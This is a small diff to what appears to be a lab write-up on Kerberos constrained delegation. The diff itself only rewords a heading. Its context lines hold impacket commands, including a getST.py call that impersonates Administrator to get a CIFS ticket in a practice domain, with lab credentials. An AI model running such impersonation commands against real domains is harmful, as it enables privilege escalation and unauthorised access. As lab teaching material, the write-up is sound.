@@ -17,7 +17,7 @@ findDelegation.py domain.local/username:password -target-domain domain.local
 
 ### The Attack
 
-Get TGS for the user for the impersonated user:
+Get TGS for the impersonated user:
 
 ```bash
 getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
